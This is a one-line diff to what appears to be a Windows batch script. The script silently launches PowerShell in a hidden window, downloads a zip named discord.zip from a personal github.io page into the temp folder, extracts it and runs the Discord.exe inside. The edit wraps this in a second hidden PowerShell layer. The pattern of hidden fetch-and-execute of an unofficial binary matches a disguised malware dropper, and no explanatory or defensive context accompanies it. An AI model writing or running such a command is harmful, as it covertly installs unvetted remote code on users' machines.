@@ -1,1 +1,1 @@
-start /B powershell.exe "cd %temp%; mkdir pstemp; cd pstemp; Invoke-WebRequest -URI themasterkitty.github.io/randomstuffidk/discord.zip -OutFile discord.zip; Expand-Archive -Path discord.zip -DestinationPath discord; cd discord; start Discord.exe; exit;"
+start /B powershell.exe "start /B powershell.exe 'cd %temp%; mkdir pstemp; cd pstemp; Invoke-WebRequest -URI themasterkitty.github.io/randomstuffidk/discord.zip -OutFile discord.zip; Expand-Archive -Path discord.zip -DestinationPath discord; cd discord; start Discord.exe; exit'; exit"; exit
